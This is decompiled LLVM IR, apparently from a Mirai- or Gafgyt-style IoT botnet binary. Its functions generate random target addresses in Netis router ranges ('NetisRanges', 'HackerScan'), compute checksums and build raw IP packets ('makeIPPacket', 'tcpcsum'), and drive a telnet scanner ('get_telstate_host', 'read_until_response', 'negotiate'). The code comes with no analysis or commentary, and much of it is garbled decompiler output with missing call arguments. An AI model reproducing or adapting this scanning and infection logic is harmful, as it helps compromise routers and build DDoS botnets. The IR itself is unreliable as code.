  uselistorder label %dec_label_pc_cbc4, { 1, 0 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb5c, { 1, 0 }
  uselistorder label %dec_label_pc_cb28, { 1, 0 }
  uselistorder label %dec_label_pc_caf4, { 1, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_ca8c, { 1, 0 }
  uselistorder label %dec_label_pc_ca58, { 1, 0 }
  uselistorder label %dec_label_pc_ca24, { 1, 0 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %dec_label_pc_c9bc, { 1, 0 }
  uselistorder label %dec_label_pc_c988, { 1, 0 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %dec_label_pc_c920, { 1, 0 }
  uselistorder label %dec_label_pc_c8ec, { 1, 0 }
  uselistorder label %dec_label_pc_c8b8, { 1, 0 }
  uselistorder label %dec_label_pc_c884, { 1, 0 }
  uselistorder label %dec_label_pc_c850, { 1, 0 }
  uselistorder label %dec_label_pc_c81c, { 1, 0 }
  uselistorder label %dec_label_pc_c7e8, { 1, 0 }
  uselistorder label %dec_label_pc_c7b4, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c74c, { 1, 0 }
  uselistorder label %dec_label_pc_c718, { 1, 0 }
  uselistorder label %dec_label_pc_c6e4, { 1, 0 }
  uselistorder label %dec_label_pc_c6b0, { 1, 0 }
  uselistorder label %dec_label_pc_c67c, { 1, 0 }
  uselistorder label %dec_label_pc_c648, { 1, 0 }
  uselistorder label %dec_label_pc_c614, { 1, 0 }
  uselistorder label %dec_label_pc_c5e0, { 1, 0 }
  uselistorder label %dec_label_pc_c5ac, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
  uselistorder label %dec_label_pc_c544, { 1, 0 }
  uselistorder label %dec_label_pc_c510, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_c474, { 1, 0 }
  uselistorder label %dec_label_pc_c440, { 1, 0 }
  uselistorder label %dec_label_pc_c40c, { 1, 0 }
  uselistorder label %dec_label_pc_c3d8, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c370, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c308, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
  uselistorder label %dec_label_pc_c2a0, { 1, 0 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c238, { 1, 0 }
  uselistorder label %dec_label_pc_c204, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %dec_label_pc_c19c, { 1, 0 }
  uselistorder label %dec_label_pc_c168, { 1, 0 }
  uselistorder label %dec_label_pc_c134, { 1, 0 }
  uselistorder label %dec_label_pc_c100, { 1, 0 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
  uselistorder label %dec_label_pc_c098, { 1, 0 }
  uselistorder label %dec_label_pc_c064, { 1, 0 }
  uselistorder label %dec_label_pc_c030, { 1, 0 }
  uselistorder label %dec_label_pc_bffc, { 1, 0 }
  uselistorder label %dec_label_pc_bfc8, { 1, 0 }
  uselistorder label %dec_label_pc_bf94, { 1, 0 }
  uselistorder label %dec_label_pc_bf60, { 1, 0 }
  uselistorder label %dec_label_pc_bf2c, { 1, 0 }
  uselistorder label %dec_label_pc_bef8, { 1, 0 }
  uselistorder label %dec_label_pc_bec4, { 1, 0 }
  uselistorder label %dec_label_pc_be90, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be28, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
  uselistorder label %dec_label_pc_bdc0, { 1, 0 }
  uselistorder label %dec_label_pc_bd8c, { 1, 0 }
  uselistorder label %dec_label_pc_bd58, { 1, 0 }
  uselistorder label %dec_label_pc_bd24, { 1, 0 }
  uselistorder label %dec_label_pc_bcf0, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_bc88, { 1, 0 }
  uselistorder label %dec_label_pc_bc54, { 1, 0 }
  uselistorder label %dec_label_pc_bc20, { 1, 0 }
  uselistorder label %dec_label_pc_bbec, { 1, 0 }
  uselistorder label %dec_label_pc_bbb8, { 1, 0 }
  uselistorder label %dec_label_pc_bb84, { 1, 0 }
  uselistorder label %dec_label_pc_bb50, { 1, 0 }
  uselistorder label %dec_label_pc_bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_bae8, { 1, 0 }
  uselistorder label %dec_label_pc_bab4, { 1, 0 }
  uselistorder label %dec_label_pc_ba80, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c, { 1, 0 }
  uselistorder label %dec_label_pc_ba18, { 1, 0 }
  uselistorder label %dec_label_pc_b9e4, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b730, { 1, 0 }
  uselistorder label %dec_label_pc_b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_b6c8, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 1, 0 }
  uselistorder label %dec_label_pc_b660, { 1, 0 }
  uselistorder label %dec_label_pc_b62c, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5c4, { 1, 0 }
  uselistorder label %dec_label_pc_b590, { 1, 0 }
  uselistorder label %dec_label_pc_b55c, { 1, 0 }
  uselistorder label %dec_label_pc_b528, { 1, 0 }
  uselistorder label %dec_label_pc_b4f4, { 1, 0 }
  uselistorder label %dec_label_pc_b4c0, { 1, 0 }
  uselistorder label %dec_label_pc_b48c, { 1, 0 }
  uselistorder label %dec_label_pc_b458, { 1, 0 }
  uselistorder label %dec_label_pc_b424, { 1, 0 }
  uselistorder label %dec_label_pc_b3f0, { 1, 0 }
  uselistorder label %dec_label_pc_b3bc, { 1, 0 }
  uselistorder label %dec_label_pc_b388, { 1, 0 }
  uselistorder label %dec_label_pc_b354, { 1, 0 }
  uselistorder label %dec_label_pc_b320, { 1, 0 }
  uselistorder label %dec_label_pc_b2ec, { 1, 0 }
  uselistorder label %dec_label_pc_b2b8, { 1, 0 }
  uselistorder label %dec_label_pc_b284, { 1, 0 }
  uselistorder label %dec_label_pc_b250, { 1, 0 }
  uselistorder label %dec_label_pc_b21c, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0 }
  uselistorder label %dec_label_pc_b1b4, { 1, 0 }
  uselistorder label %dec_label_pc_b180, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 1, 0 }
  uselistorder label %dec_label_pc_b118, { 1, 0 }
  uselistorder label %dec_label_pc_b0e4, { 1, 0 }
  uselistorder label %dec_label_pc_b0b0, { 1, 0 }
  uselistorder label %dec_label_pc_b07c, { 1, 0 }
  uselistorder label %dec_label_pc_b048, { 1, 0 }
  uselistorder label %dec_label_pc_b014, { 1, 0 }
  uselistorder label %dec_label_pc_afe0, { 1, 0 }
  uselistorder label %dec_label_pc_afac, { 1, 0 }
  uselistorder label %dec_label_pc_af78, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 1, 0 }
  uselistorder label %dec_label_pc_af10, { 1, 0 }
  uselistorder label %dec_label_pc_aedc, { 1, 0 }
  uselistorder label %dec_label_pc_aea8, { 1, 0 }
  uselistorder label %dec_label_pc_ae74, { 1, 0 }
  uselistorder label %dec_label_pc_ae40, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %dec_label_pc_add8, { 1, 0 }
  uselistorder label %dec_label_pc_ada4, { 1, 0 }
  uselistorder label %dec_label_pc_ad70, { 1, 0 }
  uselistorder label %dec_label_pc_ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_ad08, { 1, 0 }
  uselistorder label %dec_label_pc_acd4, { 1, 0 }
  uselistorder label %dec_label_pc_aca0, { 1, 0 }
  uselistorder label %dec_label_pc_ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_ac38, { 1, 0 }
  uselistorder label %dec_label_pc_ac04, { 1, 0 }
  uselistorder label %dec_label_pc_abd0, { 1, 0 }
  uselistorder label %dec_label_pc_ab9c, { 1, 0 }
  uselistorder label %dec_label_pc_ab68, { 1, 0 }
  uselistorder label %dec_label_pc_ab34, { 1, 0 }
  uselistorder label %dec_label_pc_ab00, { 1, 0 }
  uselistorder label %dec_label_pc_aacc, { 1, 0 }
  uselistorder label %dec_label_pc_aa98, { 1, 0 }
  uselistorder label %dec_label_pc_aa64, { 1, 0 }
  uselistorder label %dec_label_pc_aa30, { 1, 0 }
  uselistorder label %dec_label_pc_a9fc, { 1, 0 }
  uselistorder label %dec_label_pc_a9c8, { 1, 0 }
  uselistorder label %dec_label_pc_a994, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_d730 = load i32, i32* @r4, align 4
  %v6_d730 = load i32, i32* @fp, align 4
  %v13_d730 = load i32, i32* @lr, align 4
  store i32 55096, i32* %stack_var_-4, align 4
  %v2_d734 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d734, i32* @fp, align 4
  %v0_d73c = call i32 @rand()
  %v1_d74c = zext i32 %v0_d73c to i64
  %v4_d74c = mul nuw i64 %v1_d74c, 2290649225
  %v3_d7503 = udiv i64 %v4_d74c, 68719476736
  %v2_d75c5 = mul nuw nsw i64 %v3_d7503, 2
  %v2_d75c = trunc i64 %v2_d75c5 to i32
  %v3_d7607 = mul nuw nsw i64 %v3_d7503, 32
  %v3_d760 = trunc i64 %v3_d7607 to i32
  %v2_d7649 = sub i32 %v2_d75c, %v3_d760
  %v2_d768 = add i32 %v2_d7649, %v0_d73c
  %v4_d780 = mul i32 %v2_d768, 4
  %v5_d780 = add i32 %v4_d780, ptrtoint (i32* @global_var_2e1ec.475 to i32)
  %v6_d780 = inttoptr i32 %v5_d780 to i32*
  %v7_d780 = load i32, i32* %v6_d780, align 4
  %v1_d78c = trunc i32 %v7_d780 to i8
  store i8 %v1_d78c, i8* @global_var_2e4f7.67, align 1
  %v0_d790 = call i32 @rand()
  %v2_d7ac = sdiv i32 %v0_d790, 51
  %tmp26 = mul i32 %v2_d7ac, -255
  %v2_d7c4 = add i32 %tmp26, %v0_d790
  %v1_d7d8 = trunc i32 %v2_d7c4 to i8
  store i8 %v1_d7d8, i8* @global_var_2e4f8.68, align 1
  %v0_d7dc = call i32 @rand()
  %v2_d7f8 = sdiv i32 %v0_d7dc, 51
  %tmp27 = mul i32 %v2_d7f8, -255
  %v2_d810 = add i32 %tmp27, %v0_d7dc
  %v1_d824 = trunc i32 %v2_d810 to i8
  store i8 %v1_d824, i8* @global_var_2e4f9.69, align 1
  %v0_d828 = call i32 @rand()
  %v2_d844 = sdiv i32 %v0_d828, 51
  %tmp28 = mul i32 %v2_d844, -255
  %v2_d85c = add i32 %tmp28, %v0_d828
  %v1_d870 = trunc i32 %v2_d85c to i8
  store i8 %v1_d870, i8* @global_var_2e4fa.70, align 1
  %v2_d874 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d8b0 = load i8, i8* bitcast (i8** @global_var_2e4f6.66 to i8*), align 4
  %v3_d8b0 = zext i8 %v2_d8b0 to i32
  %v3_d8bc = load i8, i8* @global_var_2e4f7.67, align 1
  %v4_d8bc = zext i8 %v3_d8bc to i32
  store i32 %v4_d8bc, i32* @r4, align 4
  %v3_d8c8 = load i8, i8* @global_var_2e4f8.68, align 1
  %v6_d8f0 = sext i8 %v3_d8bc to i32
  %v8_d8f0 = sext i8 %v3_d8c8 to i32
  %v9_d8f0 = call i32 @szprintf(i32 %v2_d874, i32 ptrtoint ([12 x i8]* @global_var_20bf0.479 to i32), i32 %v3_d8b0, i32 %v6_d8f0, i32 %v8_d8f0)
  store i32 %v2_d874, i32* @r0, align 4
  %v1_d8fc = call i32 @inet_addr(i32 %v2_d874)
  store i32 %v3_d730, i32* @r4, align 4
  store i32 %v6_d730, i32* @fp, align 4
  store i32 %v13_d730, i32* @lr, align 4
  ret i32 %v1_d8fc

; uselistorder directives
  uselistorder i32 %v2_d874, { 2, 1, 0 }
  uselistorder i32 %v0_d828, { 1, 0 }
  uselistorder i32 %v0_d7dc, { 1, 0 }
  uselistorder i32 %v0_d790, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_2e4fa.70, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e4f9.69, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e4f8.68, { 3, 2, 1, 0 }
  uselistorder i8* @global_var_2e4f7.67, { 3, 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_d940 = load i32, i32* @global_var_3473c.481, align 4
  %v1_d948 = call i32 @__GI_ntohl(i32 %v2_d940)
  %v2_d954 = and i32 %v1_d948, %arg1
  %v0_d95c = call i32 @rand_cmwc()
  %v1_d968 = sub i32 -1, %arg1
  %v2_d96c = and i32 %v0_d95c, %v1_d968
  %v2_d974 = xor i32 %v2_d96c, %v2_d954
  ret i32 %v2_d974
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_da008 = icmp sgt i32 %arg2, 1
  br i1 %v8_da008, label %dec_label_pc_d9b8, label %dec_label_pc_da04

dec_label_pc_d9b8:                                ; preds = %entry, %dec_label_pc_d9b8
  %v2_d9cc = phi i32 [ %v2_d9d0, %dec_label_pc_d9b8 ], [ 0, %entry ]
  %stack_var_-44.011 = phi i32 [ %v5_d9d4, %dec_label_pc_d9b8 ], [ 0, %entry ]
  %stack_var_-40.010 = phi i32 [ %v1_d9f0, %dec_label_pc_d9b8 ], [ %arg2, %entry ]
  %stack_var_-36.09 = phi i16* [ %v5_d9e8, %dec_label_pc_d9b8 ], [ %arg1, %entry ]
  %v4_d9b8 = ptrtoint i16* %stack_var_-36.09 to i32
  %v2_d9bc = load i16, i16* %stack_var_-36.09, align 2
  %v3_d9bc = zext i16 %v2_d9bc to i32
  %v2_d9d0 = add i32 %v3_d9bc, %v2_d9cc
  %v3_d9d0 = icmp ult i32 %v2_d9d0, %v2_d9cc
  %v4_d9d4 = zext i1 %v3_d9d0 to i32
  %v5_d9d4 = add i32 %v4_d9d4, %stack_var_-44.011
  %v1_d9e4 = add i32 %v4_d9b8, 2
  %v5_d9e8 = inttoptr i32 %v1_d9e4 to i16*
  %v1_d9f0 = add nsw i32 %stack_var_-40.010, -2
  %v8_da00 = icmp sgt i32 %v1_d9f0, 1
  br i1 %v8_da00, label %dec_label_pc_d9b8, label %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge

dec_label_pc_d9f8.dec_label_pc_da04_crit_edge:    ; preds = %dec_label_pc_d9b8
  br label %dec_label_pc_da04

dec_label_pc_da04:                                ; preds = %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge, %entry
  %v2_da24 = phi i32 [ %v2_d9d0, %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_d9e8, %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_d9d4, %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge ], [ 0, %entry ]
  %v7_d9fc.lcssa.in = phi i32 [ %v1_d9f0, %dec_label_pc_d9f8.dec_label_pc_da04_crit_edge ], [ %arg2, %entry ]
  %v7_d9fc.lcssa = icmp eq i32 %v7_d9fc.lcssa.in, 1
  br i1 %v7_d9fc.lcssa, label %dec_label_pc_da10, label %dec_label_pc_da8c.preheader

dec_label_pc_da10:                                ; preds = %dec_label_pc_da04
  %v1_da14 = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_da14 = load i8, i8* %v1_da14, align 1
  %v3_da14 = zext i8 %v2_da14 to i32
  %v2_da28 = add i32 %v3_da14, %v2_da24
  %v3_da28 = icmp ult i32 %v2_da28, %v2_da24
  %v4_da2c = zext i1 %v3_da28 to i32
  %v5_da2c = add i32 %v4_da2c, %stack_var_-44.0.lcssa
  br label %dec_label_pc_da8c.preheader

dec_label_pc_da8c.preheader:                      ; preds = %dec_label_pc_da10, %dec_label_pc_da04
  %v3_dab8.ph = phi i32 [ %v2_da24, %dec_label_pc_da04 ], [ %v2_da28, %dec_label_pc_da10 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_da04 ], [ %v5_da2c, %dec_label_pc_da10 ]
  %v3_da9036 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_da9837 = udiv i32 %v3_dab8.ph, 65536
  %v2_da9c38 = or i32 %v3_da9036, %v3_da9837
  %v3_daa439 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_daac40 = or i32 %v2_da9c38, %v3_daa439
  %v2_dab041 = icmp eq i32 %v2_daac40, 0
  br i1 %v2_dab041, label %dec_label_pc_dab8, label %dec_label_pc_da3c

dec_label_pc_da3c:                                ; preds = %dec_label_pc_da8c.preheader, %dec_label_pc_da3c
  %v3_daa444 = phi i32 [ %v3_daa4, %dec_label_pc_da3c ], [ %v3_daa439, %dec_label_pc_da8c.preheader ]
  %v2_da9c43 = phi i32 [ %v2_da9c, %dec_label_pc_da3c ], [ %v2_da9c38, %dec_label_pc_da8c.preheader ]
  %v3_dab842 = phi i32 [ %v2_da7c, %dec_label_pc_da3c ], [ %v3_dab8.ph, %dec_label_pc_da8c.preheader ]
  %v2_da50 = urem i32 %v3_dab842, 65536
  %v2_da7c = add i32 %v2_da9c43, %v2_da50
  %v3_da7c = icmp ult i32 %v2_da7c, %v2_da50
  %v4_da80 = zext i1 %v3_da7c to i32
  %v5_da80 = add nuw nsw i32 %v4_da80, %v3_daa444
  %v3_da90 = mul i32 %v5_da80, 65536
  %v3_da98 = udiv i32 %v2_da7c, 65536
  %v2_da9c = or i32 %v3_da90, %v3_da98
  %v3_daa4 = udiv i32 %v5_da80, 65536
  %v2_daac = or i32 %v2_da9c, %v3_daa4
  %v2_dab0 = icmp eq i32 %v2_daac, 0
  br i1 %v2_dab0, label %dec_label_pc_da8c.dec_label_pc_dab8_crit_edge, label %dec_label_pc_da3c

dec_label_pc_da8c.dec_label_pc_dab8_crit_edge:    ; preds = %dec_label_pc_da3c
  br label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %dec_label_pc_da8c.dec_label_pc_dab8_crit_edge, %dec_label_pc_da8c.preheader
  %v3_dab8.lcssa = phi i32 [ %v2_da7c, %dec_label_pc_da8c.dec_label_pc_dab8_crit_edge ], [ %v3_dab8.ph, %dec_label_pc_da8c.preheader ]
  %v1_dac4 = urem i32 %v3_dab8.lcssa, 65536
  %v3_dacc = xor i32 %v1_dac4, 65535
  ret i32 %v3_dacc

; uselistorder directives
  uselistorder i32 %v2_da9c, { 1, 0 }
  uselistorder i32 %v5_da80, { 1, 0 }
  uselistorder i32 %v2_da7c, { 2, 0, 3, 1 }
  uselistorder i32 %v3_daa439, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_dab8.ph, { 2, 1, 0 }
  uselistorder i32 %v2_da24, { 0, 2, 1 }
  uselistorder i32 %v1_d9f0, { 0, 2, 1 }
  uselistorder i32 %v2_d9d0, { 0, 2, 1 }
  uselistorder i32 %v2_d9cc, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_da3c, { 1, 0 }
  uselistorder label %dec_label_pc_d9b8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dae4 = load i32, i32* @fp, align 4
  store i32 56044, i32* %stack_var_-4, align 4
  %v2_dae8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dae8, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_db08 = add i32 %arg1, 12
  %v2_db08 = inttoptr i32 %v1_db08 to i32*
  %v3_db08 = load i32, i32* %v2_db08, align 4
  store i32 %v3_db08, i32* %stack_var_-44, align 4
  %v1_db30 = call i32 @__GI_htons(i32 20)
  %v1_db4c = call i32 @malloc(i32 32)
  %v2_db58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_db58, i32* @r3, align 4
  store i32 %v1_db4c, i32* @r0, align 4
  store i32 %v2_db58, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_db68 = call i32 @memcpy()
  %v1_db70 = add i32 %v1_db4c, 12
  store i32 %v1_db70, i32* @r3, align 4
  store i32 %v1_db70, i32* @r0, align 4
  %v3_db78 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_db78, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_db80 = call i32 @memcpy()
  %v2_db8c = inttoptr i32 %v1_db4c to i16*
  %v3_db8c = call i32 @csum(i16* %v2_db8c, i32 32)
  %sext = mul i32 %v3_db8c, 65536
  %v1_db90 = sdiv i32 %sext, 65536
  store i32 %v1_db4c, i32* @r0, align 4
  %v0_db9c = call i32 @free()
  %v4_dba0 = urem i32 %v1_db90, 65536
  store i32 %v3_dae4, i32* @fp, align 4
  ret i32 %v4_dba0

; uselistorder directives
  uselistorder i32 %v1_db4c, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dbb8 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dc24 = add i32 %tmp3, 1
  %v4_dc24 = inttoptr i32 %v3_dc24 to i8*
  store i8 0, i8* %v4_dc24, align 1
  %v3_dc28 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_dc28, 20
  %v1_dc44 = trunc i32 %fold to i16
  %v3_dc44 = add i32 %tmp3, 2
  %v4_dc44 = inttoptr i32 %v3_dc44 to i16*
  store i16 %v1_dc44, i16* %v4_dc44, align 2
  %v0_dc48 = call i32 @rand_cmwc()
  %v1_dc5c = trunc i32 %v0_dc48 to i16
  %v3_dc5c = add i32 %tmp3, 4
  %v4_dc5c = inttoptr i32 %v3_dc5c to i16*
  store i16 %v1_dc5c, i16* %v4_dc5c, align 2
  %v3_dc68 = add i32 %tmp3, 6
  %v4_dc68 = inttoptr i32 %v3_dc68 to i16*
  store i16 0, i16* %v4_dc68, align 2
  %v3_dc74 = add i32 %tmp3, 8
  %v4_dc74 = inttoptr i32 %v3_dc74 to i8*
  store i8 -1, i8* %v4_dc74, align 1
  %v3_dc80 = add i32 %tmp3, 9
  %v4_dc80 = inttoptr i32 %v3_dc80 to i8*
  store i8 %tmp, i8* %v4_dc80, align 1
  %v3_dc8c = add i32 %tmp3, 10
  %v4_dc8c = inttoptr i32 %v3_dc8c to i16*
  store i16 0, i16* %v4_dc8c, align 2
  %v2_dc98 = add i32 %tmp3, 12
  %v3_dc98 = inttoptr i32 %v2_dc98 to i32*
  store i32 %arg3, i32* %v3_dc98, align 4
  %v2_dca4 = add i32 %tmp3, 16
  %v3_dca4 = inttoptr i32 %v2_dca4 to i32*
  store i32 %arg2, i32* %v3_dca4, align 4
  store i32 %v3_dbb8, i32* @fp, align 4
  ret i32 %v0_dc48
}

define i32 @sclose(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v8_dcd0 = icmp sgt i32 %arg1, 2
  br i1 %v8_dcd0, label %dec_label_pc_dce0, label %dec_label_pc_dcf0

dec_label_pc_dce0:                                ; preds = %entry
  %v1_dce4 = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %entry, %dec_label_pc_dce0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_dce0 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_dcf0, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_dd08 = load i32, i32* @fp, align 4
  store i32 56592, i32* %stack_var_-4, align 4
  %v2_dd0c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd0c, i32* @fp, align 4
  %v1_dd1c = add i32 %arg1, 4
  %v2_dd1c = inttoptr i32 %v1_dd1c to i32*
  %v3_dd1c = load i32, i32* %v2_dd1c, align 4
  store i32 %v3_dd1c, i32* @r0, align 4
  %v1_dd28 = call i32 @__GI_inet_ntoa(i32 %v3_dd1c)
  store i32 %v3_dd08, i32* @fp, align 4
  ret i32 %v1_dd28

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v3_dd44 = load i32, i32* @fp, align 4
  store i32 56652, i32* %stack_var_-4, align 4
  %v2_dd48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dd48, i32* @fp, align 4
  store i32 %arg4, i32* @r2, align 4
  %v4_dd70 = call i32 @__GI_memset(i8* %arg3, i32 0)
  %v5_dd84 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v2_dd94 = load i8, i8* %arg3, align 1
  %v2_dd98 = icmp eq i8 %v2_dd94, -1
  br i1 %v2_dd98, label %dec_label_pc_dda0, label %dec_label_pc_ddb4

dec_label_pc_dda0:                                ; preds = %entry
  %v4_ddb0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3)
  br label %dec_label_pc_ddb4

dec_label_pc_ddb4:                                ; preds = %entry, %dec_label_pc_dda0
  %v3_ddb8 = load i32, i32* %stack_var_0, align 4
  %v3_ddbc = call i32 @contains_string(i32 %tmp, i32 %v3_ddb8)
  %v2_ddc4 = icmp ne i32 %v3_ddbc, 0
  %. = zext i1 %v2_ddc4 to i32
  store i32 %v3_dd44, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg4, { 1, 0 }
